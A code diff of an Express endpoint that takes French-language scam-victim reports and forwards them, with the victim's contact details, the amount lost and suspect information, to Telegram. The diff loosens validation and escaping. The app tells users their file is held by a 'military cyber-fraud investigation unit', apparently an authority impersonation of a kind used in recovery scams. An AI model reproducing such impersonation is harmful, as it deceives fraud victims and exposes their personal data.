@@ -17,9 +17,10 @@ app.use(express.json({ limit: '10mb' }));
 const REPORTS_FILE = path.join(process.cwd(), "reports.json");
 
 // Helper to escape HTML for Telegram API safety
-function escapeHtml(unsafe: string): string {
-  if (!unsafe) return "";
-  return unsafe
+function escapeHtml(unsafe: any): string {
+  if (unsafe === null || unsafe === undefined) return "";
+  const str = String(unsafe);
+  return str
     .replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
     .replace(/>/g, "&gt;")
@@ -70,10 +71,11 @@ app.post("/api/reports", async (req, res) => {
       files, // Array of { name, size, type }
     } = req.body;
 
-    // Validate fields
-    if (!victimName || !scamCategory || !amount || !description) {
-      return res.status(400).json({ error: "Veuillez remplir les champs obligatoires." });
-    }
+    // Validate fields - We removed hard requirements per user request
+    const cleanVictimName = victimName || "Anonyme";
+    const cleanScamCategory = scamCategory || "Non spécifiée";
+    const cleanAmount = amount || "Non spécifié";
+    const cleanDescription = description || "Aucun récit de fait fourni.";
 
     // Generate unique Report ID
     const randomNum = Math.floor(100000 + Math.random() * 900000);
@@ -97,15 +99,15 @@ app.post("/api/reports", async (req, res) => {
           description: "Le dossier a été enregistré avec succès dans la base de données de l'unité d'investigation militaire cyber-fraude."
         }
       ],
-      victimName,
+      victimName: cleanVictimName,
       victimPhone,
       victimEmail,
       victimCountry,
-      scamCategory,
+      scamCategory: cleanScamCategory,
       scamDate,
-      amount,
+      amount: cleanAmount,
       currency,
-      description,
+      description: cleanDescription,
       suspectName,
       suspectPhone,
       suspectEmail,
@@ -136,15 +138,15 @@ app.post("/api/reports", async (req, res) => {
 <b>Date :</b> ${new Date().toLocaleString("fr-FR")}
 
 👤 <b>INFORMATIONS DE LA VICTIME</b>
-• <b>Nom complet :</b> ${escapeHtml(victimName)}
+• <b>Nom complet :</b> ${escapeHtml(cleanVictimName)}
 • <b>Téléphone :</b> ${escapeHtml(victimPhone || "Non renseigné")}
 • <b>E-mail :</b> ${escapeHtml(victimEmail || "Non renseigné")}
 • <b>Pays de résidence :</b> ${escapeHtml(victimCountry || "Non renseigné")}
 
 ⚠️ <b>DÉTAILS DU PRÉJUDICE</b>
-• <b>Type d'arnaque :</b> ${escapeHtml(scamCategory)}
+• <b>Type d'arnaque :</b> ${escapeHtml(cleanScamCategory)}
 • <b>Date des faits :</b> ${escapeHtml(scamDate || "Non spécifié")}
-• <b>Montant volé :</b> <b>${escapeHtml(amount)} ${escapeHtml(currency)}</b>
+• <b>Montant volé :</b> <b>${escapeHtml(cleanAmount)} ${escapeHtml(currency)}</b>
 
 🕵️ <b>INFORMATIONS SUR LE SUSPECT</b>
 • <b>Nom/Pseudo :</b> ${escapeHtml(suspectName || "Inconnu")}
@@ -154,7 +156,7 @@ app.post("/api/reports", async (req, res) => {
 • <b>Coordonnées bancaires/Crypto :</b> ${escapeHtml(suspectAccounts || "Non renseigné")}
 
 📝 <b>RÉCIT DES FAITS</b>
-<i>${escapeHtml(description)}</i>
+<i>${escapeHtml(cleanDescription)}</i>
 
 📎 <b>PIÈCES JOINTES (${filesCount})</b>
 ${filesList}
